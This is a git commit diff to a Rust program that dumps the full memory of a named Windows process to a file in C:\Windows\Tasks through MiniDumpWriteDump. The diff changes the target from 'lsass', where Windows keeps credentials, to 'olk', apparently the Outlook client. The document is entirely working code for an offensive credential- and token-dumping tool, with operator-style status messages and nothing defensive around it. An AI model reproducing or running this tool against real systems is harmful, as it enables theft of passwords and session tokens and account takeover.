ebf0b2db76a60ff9907982dbe88183f4672a56c8
Dylan Reuter <djreuter45@gmail.com>
2025-02-07 11:14:48 -0600

    update version

--- src/main.rs
+++ src/main.rs
@@ -1,18 +1,21 @@
+use std::ptr;
+
 use sysinfo::{System, ProcessExt, SystemExt, PidExt};
 use windows::Win32::Security::SECURITY_ATTRIBUTES;
 use windows::Win32::Storage::FileSystem::{CreateFileA, FILE_SHARE_MODE, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL};
-use windows::Win32::System::Diagnostics::Debug::{MiniDumpWriteDump, MiniDumpWithFullMemory, MINIDUMP_EXCEPTION_INFORMATION, MINIDUMP_USER_STREAM_INFORMATION, MINIDUMP_CALLBACK_INFORMATION};
+use windows::Win32::System::Diagnostics::Debug::{MiniDumpNormal, MiniDumpWithFullMemory, MiniDumpWriteDump, MINIDUMP_CALLBACK_INFORMATION, MINIDUMP_EXCEPTION_INFORMATION, MINIDUMP_USER_STREAM_INFORMATION};
 use windows::Win32::System::Threading::{OpenProcess, PROCESS_ACCESS_RIGHTS};
 use windows::Win32::Foundation::{HANDLE, CloseHandle, GetLastError};
 use windows::core::PCSTR;
-use windows::s;
+use windows_strings::s;
+
 
 fn get_pid() -> u32 {
     let mut sys: System = System::new_all();
     sys.refresh_all();
 
     let mut pid: u32 = 0;
-    for process in sys.processes_by_name("lsass") {
+    for process in sys.processes_by_name("olk") {
         pid = process.pid().as_u32();
     }
     return pid;
@@ -45,16 +48,16 @@ fn main() {
         const GENERIC_WRITE: u32 = 0x40000000;
 
         let f_name: PCSTR = s!("C:\\Windows\\Tasks\\rustdump.dmp");
-        let mut sa: SECURITY_ATTRIBUTES = SECURITY_ATTRIBUTES::default();
+        // let mut sa: SECURITY_ATTRIBUTES = SECURITY_ATTRIBUTES::default();
         println!("[+] Creating file...");
         let h_file: HANDLE = CreateFileA(
             f_name,
-            GENERIC_READ | GENERIC_WRITE,
+            GENERIC_WRITE,
             FILE_SHARE_MODE(0),
-            Some(&mut sa),
+            Some(ptr::null_mut()),
             CREATE_ALWAYS,
             FILE_ATTRIBUTE_NORMAL,
-            HANDLE(0)
+            Some(HANDLE::default())
         ).unwrap();
 
         let mini_excep: *const MINIDUMP_EXCEPTION_INFORMATION = std::ptr::null();
@@ -62,7 +65,7 @@ fn main() {
         let mini_cb: *const MINIDUMP_CALLBACK_INFORMATION = std::ptr::null();
 
         println!("[+] Creating dump...");
-        if !MiniDumpWriteDump(
+        if MiniDumpWriteDump(
             h_proc,
             pid,
             h_file,
@@ -70,14 +73,14 @@ fn main() {
             Some(mini_excep),
             Some(mini_userstr),
             Some(mini_cb)
-        ).as_bool() {
+        ).is_err() {
             let e = GetLastError();
-            CloseHandle(h_file);
-            CloseHandle(h_proc);
+            CloseHandle(h_file).unwrap();
+            CloseHandle(h_proc).unwrap();
             panic!("Error creating dump! {:?}", e);
         }
-        CloseHandle(h_file);
-        CloseHandle(h_proc);
+        CloseHandle(h_file).unwrap();
+        CloseHandle(h_proc).unwrap();
         println!("[+] Dump file saved to {}", f_name.to_string().unwrap());
     }
 }
